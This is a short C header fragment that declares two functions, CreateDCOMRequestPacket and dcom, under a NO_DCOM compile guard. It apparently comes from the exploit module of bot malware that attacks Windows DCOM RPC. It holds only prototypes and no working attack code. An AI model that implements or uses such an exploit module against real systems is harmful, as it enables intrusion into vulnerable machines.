#ifndef NO_DCOM
char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, bool NamedPipe);
bool dcom(EXINFO exinfo);
#endif